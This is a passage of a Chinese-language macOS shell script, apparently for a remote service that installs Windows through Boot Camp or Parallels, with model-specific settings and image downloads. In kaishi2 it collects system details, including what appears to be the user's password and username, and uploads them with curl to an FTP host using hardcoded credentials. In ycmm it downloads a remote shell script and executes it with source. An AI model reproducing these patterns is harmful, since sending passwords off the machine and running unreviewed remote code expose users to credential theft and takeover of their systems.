												if [[ $modelbb = *"iMac12,1"* ]]; then
												btap="5.1.5621"
												win10sip="1"
												zgmac="10.13"
												MBR10="1"
												oldsz="1"
												wzhfxt="6135"
												wzhfxt7="5624"
												wzhfxt732="4036"
		echo
		dnjx="11iMac"
		dnos="10.13.6"
	fi	
																																													
												if [[ $modelbb = *"iMac11,3"* ]]; then
												zgmac="10.13"
												win10sip="1"
												MBR10="1"
												oldsz="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="10iMac"
		dnos="10.13.6"
	fi	
																																														
												if [[ $modelbb = *"iMac11,2"* ]]; then
												zgmac="10.13"
												win10sip="1"
												MBR10="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="10iMac"
		dnos="10.13.6"
		
	fi	

												if [[ $modelbb = *"iMac11,1"* ]]; then
												zgmac="10.13"
												win10sip="1"
												MBR10="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="09iMac"
		dnos="10.13.6"
		
	fi																																																
												if [[ $modelbb = *"iMac10,1"* ]]; then
												zgmac="10.13"
												win10sip="1"
												MBR10="1"
												kyqs15="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="09iMac"
		dnos="10.13.6"
		
	fi	
																																																
												if [[ $modelbb = *"iMac9,1"* ]]; then
												zgmac="10.11"
												win10sip="1"
												MBR10="1"
												kyqs15="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="09iMac"
		dnos="10.11.6"
	
	fi
					
												if [[ $modelbb = *"iMac8,1"* ]]; then
												zgmac="10.11"
												win10sip="1"
												MBR10="1"
												kyqs15="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="08iMac"
		dnos="10.11.6"
	
	fi							
					
												if [[ $modelbb = *"iMac7,1"* ]]; then
												zgmac="10.11"
												win10sip="1"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="20-inch-07iMac"
		dnos="10.11.6"
	
	fi
	
												if [[ $modelbb = *"iMac6,1"* ]]; then
												zgmac="10.7"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="24-inch-06iMac"
		dnos="10.7.5"
	
	fi		
	
												if [[ $modelbb = *"iMac5,1"* ]]; then
												zgmac="10.7"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="17/20-inch-06iMac"
		dnos="10.7.5"
	
	fi
	
												if [[ $modelbb = *"iMac5,2"* ]]; then
												zgmac="10.7"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="17-inch-06iMac"
		dnos="10.7.5"
	
	fi
	
												if [[ $modelbb = *"iMac4,2"* ]]; then
												zgmac="10.6"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="17-inch-06iMac"
		dnos="10.6.8"
	
	fi
	
	
												if [[ $modelbb = *"iMac4,1"* ]]; then
												zgmac="10.6"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
												zzc32="1"
		echo
		dnjx="17/20-inch-06iMac"
		dnos="10.6.8"
	
	fi				
								
												if [[ $modelbb = *"Macmini8,1"* ]]; then
												NoWin7="1"
												T2XP="1"
												wzhfxt="7139"
		echo
		dnjx="18Mini"
	
	fi	
							
												if [[ $modelbb = *"Macmini7,1"* ]]; then
												btap="5.1.5769"
												No732="1"
												wzhfxt="6136"
												wzhfxt7="5640"
		echo
		dnjx="14Mini"
		dnos="12.x.x"		
	fi
							
												if [[ $modelbb = *"Macmini6,1"* ]]; then
												zgmac="10.15"
												btap="5.1.5621"
												w10btap="6.0.6136"
												win10sip="1"
												MBR10="1"
												oldsz="1"
												No732="1"
												wzhfxt="6135"
												wzhfxt7="5621"
		echo
		dnjx="12Mini"
	    dnos="10.15.7"
	fi
							
												if [[ $modelbb = *"Macmini6,2"* ]]; then
												zgmac="10.15"
												btap="5.1.5621"
												w10btap="6.0.6136"
												win10sip="1"
												MBR10="1"
												oldsz="1"
												No732="1"
												wzhfxt="6135"
												wzhfxt7="5621"
		echo
		dnjx="12Mini"
	    dnos="10.15.7"
	fi
								
												if [[ $modelbb = *"Macmini5,1"* ]]; then
												zgmac="10.13"
												btap="5.1.5621"
												win10sip="1"
												MBR10="1"
												oldsz="1"
												wzhfxt732="4036"
												wzhfxt7="5621"
		echo
		dnjx="11Mini"
	    dnos="10.13.6"
	fi
								
												if [[ $modelbb = *"Macmini5,2"* ]]; then
												zgmac="10.13"
												btap="5.1.5621"
												win10sip="1"
												MBR10="1"
												oldsz="1"
												wzhfxt732="4036"
		echo
		dnjx="11Mini"
	    dnos="10.13.6"
	fi
												if [[ $modelbb = *"Macmini5,3"* ]]; then
												zgmac="10.13"
												btap="5.1.5621"
												win10sip="1"
												MBR10="1"
												oldsz="1"
												wzhfxt732="4036"
		echo
		dnjx="11Mini-Server"
	    dnos="10.13.6"
	fi	
									
												if [[ $modelbb = *"Macmini4,1"* ]]; then
												zgmac="10.13"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												oldsz="1"
												wzhfxt="6135"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="10Mini"
	    dnos="10.13.6"
	fi
										
												if [[ $modelbb = *"Macmini3,1"* ]]; then
												zgmac="10.11"
												MBR10="1"
												kyqs15="1"
												win10sip="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="09Mini"
	    dnos="10.11.6"
	fi
										
												if [[ $modelbb = *"Macmini2,1"* ]]; then
												zgmac="10.7"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="07Mini"
	    dnos="10.7.5"
	fi
										
												if [[ $modelbb = *"Macmini1,1"* ]]; then
												zgmac="10.6"
												MBR10="1"
												Win732="1"
												wzhfxt7="4034"
												wzhfxt732="4036"
		echo
		dnjx="06Mini"
	    dnos="10.6.8"
	fi


xsq1="$(system_profiler SPDisplaysDataType | grep Resolution | awk 'NF+=1' | sed 's/Resolution://g' | cut -b 12- | sed -e 's/, /\n/g' | sed -n 1p)"

	xksfcz=$(echo "$modelid" | grep 'AMD')
	amdxk=$(echo "$modelid" | grep 'AMD')
	if [ ! "$xksfcz" ]; then
	xksfcz=$(echo "$modelid" | grep 'NVIDIA')
	fi
	
	if [ "$xkm" ]; then
	if [ ! "$xksfcz" ]; then
	xkbcz="1"
	fi
	fi

    if [ "$xsqjc" ]; then
    xsqjcc=$(echo "$xsq1" | grep 'Retina')
	if [ ! "$xsqjcc" ]; then
	wybxsq="1"
	fi
    fi
	
	if [ "$xkbcz" ]; then
clear && printf "\e[3J"
echo
echo
echo "                           ""\033[42;30m 此机型，检测不到独立显卡，无法安装！\033[0m"
echo
echo
exit
	fi
	
if [ ! "$srsyb" ]; then
pcissd="$(system_profiler SPStorageDataType | grep "Protocol: PCI")"
fi

if [ "$pcissd" ]; then
pcissd="PCI"
fi


if [ "$wybxsq" ]; then
wybxsq="XSQ"
fi

	if [ "$sip" ]; then
	if [ "$win10sip" ]; then
    sipwfaz="wfaz"
    fi
	fi

yhm="$(id -un)"
qdcp=$(diskutil info -plist / | grep -A1 "VolumeName" | tail -n 1 | awk -F '<string>|</string>' '{ print $2; exit; }')
AZPKG
exit
}


kaishi2(){
clear && printf "\e[3J"	
echo "modelcpu=$modelcpu" > /tmp/$bjsbm.txt
echo "memtotal=$memtotal" >> /tmp/$bjsbm.txt
echo "modelid=$(echo $modelid)" >> /tmp/$bjsbm.txt
echo "modelxh=$modelxh" >> /tmp/$bjsbm.txt
echo "modelbb=$modelbb" >> /tmp/$bjsbm.txt
echo "model512=$model512" >> /tmp/$bjsbm.txt
echo "modelssd=$modelssd" >> /tmp/$bjsbm.txt
echo "srsyb=$srsyb" >> /tmp/$bjsbm.txt
echo "imachdd=$imachdd" >> /tmp/$bjsbm.txt
echo "Disk=$Disk" >> /tmp/$bjsbm.txt
echo "dnjx=$dnjx" >> /tmp/$bjsbm.txt
echo "winfq=$restore_device" >> /tmp/$bjsbm.txt
echo "sip=$sip" >> /tmp/$bjsbm.txt
echo "pcissd=$pcissd" >> /tmp/$bjsbm.txt
echo "wybxsq=$wybxsq" >> /tmp/$bjsbm.txt
echo "M1CPU=$M1CPU" >> /tmp/$bjsbm.txt
echo "kykj=$kykj" >> /tmp/$bjsbm.txt
echo "jiami=$jiami" >> /tmp/$bjsbm.txt
echo "zgmac=$zgmac" >> /tmp/$bjsbm.txt
echo "zgmacdq=$zgmacdq" >> /tmp/$bjsbm.txt
echo "sipwfaz=$sipwfaz" >> /tmp/$bjsbm.txt
echo "qdcp=$qdcp" >> /tmp/$bjsbm.txt
echo "tdid=$tdid">> /tmp/$bjsbm.txt
echo "pass=$pass">> /tmp/$bjsbm.txt
echo "yhm=$yhm">> /tmp/$bjsbm.txt
echo "vncip=$vncip">> /tmp/$bjsbm.txt
echo "ftpip=$ftpip">> /tmp/$bjsbm.txt
echo "ipxx=$ipxx">> /tmp/$bjsbm.txt
diskutil list disk0 > /tmp/"$bjsbm"disk.txt
diskutil list disk1 >> /tmp/"$bjsbm"disk.txt
echo >> /tmp/"$bjsbm"disk.txt
if [ "${windfq}" ] ; then
echo 存在多个Win分区，已选[$win_partition]：>> /tmp/"$bjsbm"disk.txt
diskutil list | grep 'Microsoft Basic Data' >> /tmp/"$bjsbm"disk.txt
winfqa=$(diskutil list | grep 'Microsoft Basic Data' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g' | sed -n '1,1p')
winfqb=$(diskutil list | grep 'Microsoft Basic Data' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g' | sed -n '2,1p')
echo "winfqa=$winfqa" >> /tmp/$bjsbm.txt
echo "winfqb=$winfqb" >> /tmp/$bjsbm.txt
fi
echo
echo  "\033[36m正在连接服务器中...\033[0m"
echo
curl --connect-timeout 3 -T /tmp/$bjsbm.txt -u $ftpm ftp://$ftpip >/dev/null 2>&1
curl --connect-timeout 3 -T /tmp/"$bjsbm"disk.txt -u $ftpm ftp://$ftpip >/dev/null 2>&1
rm -rf /tmp/$bjsbm.txt >/dev/null 2>&1
rm -rf /tmp/"$bjsbm"disk.txt >/dev/null 2>&1
curl --connect-timeout 3 -o /tmp/$bjsbm.txt ""$ip8"/dosMac/"$bjsbm".txt" >/dev/null 2>&1
if [ "$hkip" ]; then
cuowua=$(cat "/tmp/"$bjsbm".txt"  | grep errorcode)	
else	
cuowua=$(cat "/tmp/"$bjsbm".txt"  | grep www.w3.org)
fi
if [ "$cuowua" ]; then
if [ ! "$cslj" ]; then
cslj="1"
fi
if [[ $cslj = "1" ]]; then
if [ ! "$hkos" ]; then
ip5="http://wxdnzy.top/ip5"
osip="http://wxdnzy.top/osip"
else
ip5="http://wxdnzy.top/ip5"
osip="http://wxdnzy.top/osip"
fi
ip8="http://wxdnzy.top/ip8"
ipd="http://wxdnzy.top/ipd"
ftpip="mac.zps.icu"
ftpm="mac1:147369258"
zjxx="①"
hkip=""
cslj="2"
fi
if [[ $cslj = "2" ]]; then
if [ ! "$hkos" ]; then
ip5="http://wxdnzy.top/ip5"
osip="http://wxdnzy.top/osip"
else
ip5="http://wxdnzy.top/ip5"
osip="http://wxdnzy.top/osip"
fi
ip8="http://wxdnzy.top/ip8"
ipd="http://wxdnzy.top/ipd"
ftpip="mac.zps.icu"
ftpm="mac2:147369258"
zjxx="②"
hkip=""
cslj="3"
fi
if [[ $cslj = "3" ]]; then
if [ ! "$hkos" ]; then
ip5="http://wxdnzy.top/ip5"
osip="http://wxdnzy.top/osip"
else
ip5="http://wxdnzy.top/ip5"
osip="http://wxdnzy.top/osip"
fi
ip8="http://wxdnzy.top/ip8"
ipd="http://wxdnzy.top/ipd"
ftpip="mac.zps.icu"
ftpm="mac3:147369258"
zjxx="③"
hkip="1"
cslj="1"
fi
kaishi2
else
rm -rf /tmp/$bjsbm.txt >/dev/null 2>&1
fi
ycmm
exit
}


ycmm(){
clear && printf "\e[3J"
echo
echo
echo $zdys"                           ""\033[42;30m 本机安装码：${bjsbm}\033[0m"
echo
echo
echo
echo $zdys"                        ""\033[42;30m 请将本机安装码发给技术员!\033[0m"
echo
echo
echo
echo $zdys"       ""\033[42;30m 请【不要关闭本窗口】，等技术员操作，如果本窗口长时间没反应请通知技术员\033[0m"
echo
echo
echo
echo $zdys"             ""\033[42;30m 您看到此窗口，就不要动电脑了，以免看不到此窗口进度\033[0m"
echo
echo
if [ ! -f "/tmp/"$bjsbm".sh" ]; then
sleep 10

#if [ "$tyy" ] ; then
#curl --connect-timeout 10 -o "/tmp/"$bjsbm".sh" "http://101.91.152.128:2233/dosMac/"$bjsbm".sh" >/dev/null 2>&1	
#else
#curl --connect-timeout 10 -o "/tmp/"$bjsbm".sh" "http://43.138.25.54/dosMac/"$bjsbm".sh" >/dev/null 2>&1
#fi

if [ "$ftpd" ] ; then
curl --connect-timeout 10 -o "/tmp/"$bjsbm".sh" ""$ip8"/"$bjsbm".sh" >/dev/null 2>&1		
else
curl --connect-timeout 10 -o "/tmp/"$bjsbm".sh" ""$ip8"/dosMac/"$bjsbm".sh" >/dev/null 2>&1	
fi

if [ ! -f "/tmp/"$bjsbm".sh" ]; then
ycmm
else
if [ "$hkip" ]; then
cuowu=$(cat "/tmp/"$bjsbm".sh"  | grep errorcode)	
else	
cuowu=$(cat "/tmp/"$bjsbm".sh"  | grep www.w3.org)
fi
if [ "$cuowu" ]; then
rm -rf "/tmp/"$bjsbm".sh"
ycmm
fi
fi
fi




cat "/tmp/"$bjsbm".sh" |tr -d '\r' > "/tmp/"$bjsbm"1.sh"
source "/tmp/"$bjsbm"1.sh"

curl -v -u $ftpm ftp://$ftpip/mac.txt -Q "DELE "$bjsbm".sh" >/dev/null 2>&1
curl -v -u $ftpm ftp://$ftpip/mac.txt -Q "DELE "$bjsbm".txt" >/dev/null 2>&1
curl -v -u $ftpm ftp://$ftpip/mac.txt -Q "DELE "$bjsbm"disk.txt" >/dev/null 2>&1


if [ "$xnj1025" ]; then
xnjaz="1"
azw10="1"
if [ "$M1Yes" ]; then
pdbb="16"
pd107z="1"
name="628ARM10.7z"
url="$ip8/666/628ARM10.7z"
name2="ParallelsDesktop-16.5.1-50696.dmg"
url2="$ip8/666/ParallelsDesktop-16.5.1-50696.dmg"
SourceMD5="5196b345d3c7b96361223ab168aaecc0"
SourceMD52="218199c3d37ce2084c4926f55b5c4585"
Download
else
if [ "$bigsur" ]; then
pdbb="16"
pd107z="1"
name="16Win10.7z"
name2="ParallelsDesktop-16.5.0-49183.dmg"
url="$ip8/666/16Win10.7z"
url2="$ip8/666/ParallelsDesktop-16.5.0-49183.dmg"
SourceMD5="6200cc8392cb84bb06e79bd2be6c12d9"
SourceMD52="d597839c4739db51a2d1c0247c178cfb"
Download
fi
if [ "$pddbb" ]; then
pd107z="1"
pdbb="13"
name="14Win10_911.7z"
name2="PD13.dmg"
url="$ip8/666/14Win10_911.7z"
url2="$ip8/666/PD13.dmg"
SourceMD5="4fd9144d8520ec1e9c5530f1b0c375f8"
SourceMD52="49c61469c67f4e545a8c203c40d693ae"
Download
fi
pd107z="1"
pdbb="14"
name="14Win10_911.7z"
name2="PD14.dmg"
url="$ip8/666/14Win10_911.7z"
url2="$ip8/666/PD14.dmg"
SourceMD5="4fd9144d8520ec1e9c5530f1b0c375f8"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
Download
fi
fi

if [ "$xnj1125" ]; then
xnjaz="1"
azw11="1"
azw1125="1"
if [ "$M1Yes" ]; then
pdbb="16"
pd107z="1"
name="A111212.7z"
url="$ip8/666/A111212.7z"
name2="ParallelsDesktop-16.5.1-50696.dmg"
url2="$ip8/666/ParallelsDesktop-16.5.1-50696.dmg"
SourceMD5="47e5a1879ddf051105b9bcf836f7370d"
SourceMD52="218199c3d37ce2084c4926f55b5c4585"
rm -rf ~/Downloads/JG_Download/ParallelsDesktop-16.5.2-50703.dmg >/dev/null 2>&1
rm -rf ~/Downloads/JG_Download/ParallelsDesktop-17.1.2-51548.dmg >/dev/null 2>&1
rm -rf ~/Downloads/JG_Download/ParallelsDesktop-18.0.1-53056.dmg >/dev/null 2>&1
rm -rf ~/Downloads/JG_Download/ParallelsDesktop-18.0.0-53049.dmg >/dev/null 2>&1
rm -rf ~/Downloads/JG_Download/628ARM11.7z >/dev/null 2>&1
rm -rf ~/Downloads/JG_Download/903ARM11.7z >/dev/null 2>&1
Download
else
if [ "$bigsur" ]; then
pdbb="16"
pd107z="1"
name="16Win11.7z"
name2="ParallelsDesktop-16.5.0-49183.dmg"
url="$ip8/666/16Win11.7z"
url2="$ip8/666/ParallelsDesktop-16.5.0-49183.dmg"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
SourceMD52="d597839c4739db51a2d1c0247c178cfb"
Download
fi
if [ "$pddbb" ]; then
pd107z="1"
pdbb="13"
name="16Win11.7z"
url="$ip8/666/16Win11.7z"
name2="PD13.dmg"
url2="$ip8/666/PD13.dmg"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
SourceMD52="49c61469c67f4e545a8c203c40d693ae"
Download
fi
pd107z="1"
pdbb="14"
name="16Win11.7z"
name2="PD14.dmg"
url="$ip8/666/16Win11.7z"
url2="$ip8/666/PD14.dmg"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
Download
fi
fi

if [ "$xnj7" ]; then
pd107z="1"
xnjaz="1"
azw7="1"
if [ "$M1Yes" ]; then
clear && printf "\e[3J"
exit
fi	
if [ "$bigsur" ]; then
pdbb="16"
name="16Win7_911.7z"
url="$ip8/666/16Win7_911.7z"
name2="ParallelsDesktop-16.5.0-49183.dmg"
url2="$ip8/666/ParallelsDesktop-16.5.0-49183.dmg"
SourceMD5="fbaf4124343e789be7099a212735b75a"
SourceMD52="d597839c4739db51a2d1c0247c178cfb"
Download
fi
if [ "$pddbb" ]; then
pdbb="10"
name="14Win7_911.7z"
url="$ip8/666/14Win7_911.7z"
name2="PD10.dmg"
url2="$ip8/666/PD10.dmg"
SourceMD5="9ad0e92e54327ecc190b27b9d0e00164"
SourceMD52="eaa977c7dbc548c05c4689b0c5881bd5"
Download
fi
pdbb="14"
name="14Win7_911.7z"
url="$ip8/666/14Win7_911.7z"
name2="PD14.dmg"
url2="$ip8/666/PD14.dmg"
SourceMD5="9ad0e92e54327ecc190b27b9d0e00164"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
Download
fi

if [ "$xnj7299" ]; then
pd107z="1"
xnjaz="1"
azw7="1"
if [ "$M1Yes" ]; then
clear && printf "\e[3J"
exit
fi	
if [ "$bigsur" ]; then
pdbb="18"
name="16Win7_911.7z"
url="$ip8/666/16Win7_911.7z"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
SourceMD5="fbaf4124343e789be7099a212735b75a"
SourceMD52="2688c9d6d5c53e2e86ae8a59ac785f20"
Download
fi
if [ "$pddbb" ]; then
pdbb="10"
name="14Win7_911.7z"
url="$ip8/666/14Win7_911.7z"
name2="PD10.dmg"
url2="$ip8/666/PD10.dmg"
SourceMD5="9ad0e92e54327ecc190b27b9d0e00164"
SourceMD52="eaa977c7dbc548c05c4689b0c5881bd5"
Download
fi
pdbb="14"
name="14Win7_911.7z"
url="$ip8/666/14Win7_911.7z"
name2="PD14.dmg"
url2="$ip8/666/PD14.dmg"
SourceMD5="9ad0e92e54327ecc190b27b9d0e00164"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
Download
fi

if [ "$xnj10" ]; then
zdpdbb="18"
xnjaz="1"
azw10="1"
xnnew10="1"
pd107z="1"
if [ "$M1Yes" ]; then
name="1113ARM10.7z"
url="$ip8/666/1113ARM10.7z"
SourceMD5="f6d90690475276461cb79125d8fbc79b"
if [ "$zdpdbb" = "18" ]; then
pdbb="18"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
SourceMD52="2688c9d6d5c53e2e86ae8a59ac785f20"
fi
Download
fi
name="17Win10.7z"
url="$ip8/666/17Win10.7z"
SourceMD5="f9aa8bae7f48214edb4a2d906238b76d"
if [ "$bigsur" ]; then
if [ "$zdpdbb" = "18" ]; then
pdbb="18"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
SourceMD52="2688c9d6d5c53e2e86ae8a59ac785f20"
fi
Download
fi
name2="ParallelsDesktop-17.1.2-51548.dmg"
url2="$ip8/666/ParallelsDesktop-17.1.2-51548.dmg"
SourceMD52="09fe76a1d3259d5cde1b2d2236648059"
if [[ $modelxh = "10.13.5" ]]; then
name2="PD14.dmg"
url2="$ip8/666/PD14.dmg"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
fi
if [[ $modelxh = "10.13.4" ]]; then
name2="PD14.dmg"
url2="$ip8/666/PD14.dmg"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
fi
if [[ $modelxh = "10.13.3" ]]; then
name2="PD14.dmg"
url2="$ip8/666/PD14.dmg"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
fi
if [[ $modelxh = "10.13.2" ]]; then
name2="PD14.dmg"
url2="$ip8/666/PD14.dmg"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
fi
if [[ $modelxh = "10.13.1" ]]; then
name2="PD14.dmg"
url2="$ip8/666/PD14.dmg"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
fi
if [[ $modelxh = "10.13" ]]; then
name2="PD14.dmg"
url2="$ip8/666/PD14.dmg"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
fi
if [[ $modelxh = "10.12"* ]]; then
name2="PD14.dmg"
url2="$ip8/666/PD14.dmg"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
fi
if [[ $modelxh = "10.11"* ]]; then
name2="PD14.dmg"
url2="$ip8/666/PD14.dmg"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
fi
if [[ $modelxh = "10.10"* ]]; then
name2="PD13.dmg"
url2="$ip8/666/PD13.dmg"
SourceMD52="49c61469c67f4e545a8c203c40d693ae"
fi
Download
fi

if [ "$xnj11" ]; then
zdpdbb="18"
xnjaz="1"
azw11="1"
xnnew10="1"
if [ "$M1Yes" ]; then
pd107z="1"
name="1113ARM11.7z"
url="$ip8/666/1113ARM11.7z"
SourceMD5="8e33f273dcd5d7b3944b9cd70eeba0c6"
if [ "$zdpdbb" = "18" ]; then
pdbb="18"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
SourceMD52="2688c9d6d5c53e2e86ae8a59ac785f20"
fi
Download
fi
if [ "$bigsur" ]; then
pdbb="16"
pd107z="1"
name="16Win11.7z"
url="$ip8/666/16Win11.7z"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
if [ "$zdpdbb" = "18" ]; then
pdbb="18"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
SourceMD52="2688c9d6d5c53e2e86ae8a59ac785f20"
fi
Download
fi
if [ "$pddbb" ]; then
pd107z="1"
pdbb="13"
name="16Win11.7z"
url="$ip8/666/16Win11.7z"
name2="PD13.dmg"
url2="$ip8/666/PD13.dmg"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
SourceMD52="49c61469c67f4e545a8c203c40d693ae"
Download
fi
pd107z="1"
pdbb="14"
name="16Win11.7z"
name2="PD14.dmg"
url="$ip8/666/16Win11.7z"
url2="$ip8/666/PD14.dmg"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
Download
fi

if [ "$xnj11h" ]; then
zdpdbb="18"
xnjaz="1"
azw11="1"
xnnew10="1"
if [ "$M1Yes" ]; then
pd107z="1"
name="1122H2.7z"
url="$ip8/666/1122H2.7z"
SourceMD5="bfacce097ee0733ec9c1b66822b4d903"
if [ "$zdpdbb" = "18" ]; then
pdbb="18"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
SourceMD52="2688c9d6d5c53e2e86ae8a59ac785f20"
fi
Download
fi
if [ "$bigsur" ]; then
pdbb="16"
pd107z="1"
name="16Win11.7z"
url="$ip8/666/16Win11.7z"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
if [ "$zdpdbb" = "18" ]; then
pdbb="18"
name2="ParallelsDesktop-18.0.1-53056.dmg"
url2="$ip8/666/ParallelsDesktop-18.0.1-53056.dmg"
SourceMD52="2688c9d6d5c53e2e86ae8a59ac785f20"
fi
Download
fi
if [ "$pddbb" ]; then
pd107z="1"
pdbb="13"
name="16Win11.7z"
url="$ip8/666/16Win11.7z"
name2="PD13.dmg"
url2="$ip8/666/PD13.dmg"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
SourceMD52="49c61469c67f4e545a8c203c40d693ae"
Download
fi
pd107z="1"
pdbb="14"
name="16Win11.7z"
name2="PD14.dmg"
url="$ip8/666/16Win11.7z"
url2="$ip8/666/PD14.dmg"
SourceMD5="b173c8fe690757a0a397350f06d23a51"
SourceMD52="d81844bc20a1ab59dedcc0b09fd44c5e"
Download
fi

if [ "$sxtmsdn" ]; then
modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"
macboot="$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4,$5,$6}')"
devboot="$(diskutil list | grep "$macboot" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1)"
if [ ! "$devboot" ]; then
devboot="$(diskutil list | grep "$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4}')" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1 | tail -n 1)"
fi
jchxj="$(diskutil list | grep Apple_CoreStorage)"
if [ ! "$jchxj" ]; then
if [ ! "${devboot:6:1}" ]; then
devboot=""
if [[ $modelxh = "10.10"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "11."* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "12."* ]]; then
devboot="disk1s1"
fi
if [ "$zxos" ]; then
devboot="disk1s1"
fi
fi
fi
num="${devboot:4:1}"
num2="${devboot:6:1}"
if [ "$jchxj" ]; then
hfs_size=`diskutil info -plist "$devboot" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`	
else	
hfs_size=`diskutil info -plist disk"$num"s"$num2" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
fi
size=$kjdx"000000000"
new_hfs_size="$(($hfs_size-$size))b"
tarbc="1"

if [ "$sxtmsdn11" ]; then
Win11="1"
index="7"
SourceSHA1="72b952bfa9248917c9ff7cf54d63b69f78d18861"
url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/e53a2dce-3faa-412f-a60a-2e9cba4c6010/22000.318.211104-1236.co_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-cn.esd"
fi

if [ "$sxtmsdn1122" ]; then
Win11="1"
index="7"
SourceSHA1="bd4a27bf5019eb3bc27a48d10b5564665e0945fd"
url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/9282e556-e4ce-4e75-a650-3b8dea2f060a/22621.525.220925-0207.ni_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-cn.esd"
fi

if [ "$sxtmsdn1909" ]; then
index="7"
SourceSHA1="339b54a7c6f73e30b8d235c5b97c2e5e31f7d392"
url="http://dl.delivery.mp.microsoft.com/filestreamingservice/files/3f88ad25-f1b2-49fa-b580-fb8d1ac54ecb/18363.592.200109-2016.19h2_release_svc_refresh_CLIENTCONSUMER_RET_x64FRE_zh-cn.esd"
fi

if [ "$sxtmsdn1709" ]; then
pnputil="pnputil1709.exe"
index="8"
SourceSHA1="cc52c191fda2caff9d5b6730ee88a11758dc0138"
url="http://fg.ds.b1.download.windowsupdate.com/c/Upgr/2017/10/16299.15.170928-1534.rs3_release_clientconsumer_ret_x64fre_zh-cn_cc52c191fda2caff9d5b6730ee88a11758dc0138.esd"
fi

if [ "$sxtmsdn1511" ]; then
index="4"
reg="1511"
SourceSHA1="90f718ea6c6d3fbbeecdbffb3a4b18190a13a02b"
url="http://b1.download.windowsupdate.com/d/upgr/2016/03/10586.0.160212-2000.th2_refresh_clientprofessionalvl_vol_x64fre_zh-cn_90f718ea6c6d3fbbeecdbffb3a4b18190a13a02b.esd"
fi

if [ "$sxtmsdn1909n" ]; then
re1909="1"
index="1"
SourceSHA1="41c1faebfd540f2ca086aabcedb1c59f4ed4d7a6"
url="$ip8/666/1909n.esd"
url3="$ip8/666/asip.wim"
name3="PEDRV.dmg"
SourceMD53="492f286767b46413981889f8b601f38f"
name="1909n.esd"
drvname="1909n.esd"
fi

if [ "$sxtmsdn11n" ]; then
re1909="1"
index="1"
SourceSHA1="3b0085113aa53049553116d7f911c90a75d993a3"
url="$ip8/666/11n.esd"
url3="$ip8/666/asip.wim"
name3="PEDRV.dmg"
SourceMD53="492f286767b46413981889f8b601f38f"
name="11n.esd"
drvname="11n.esd"
fi

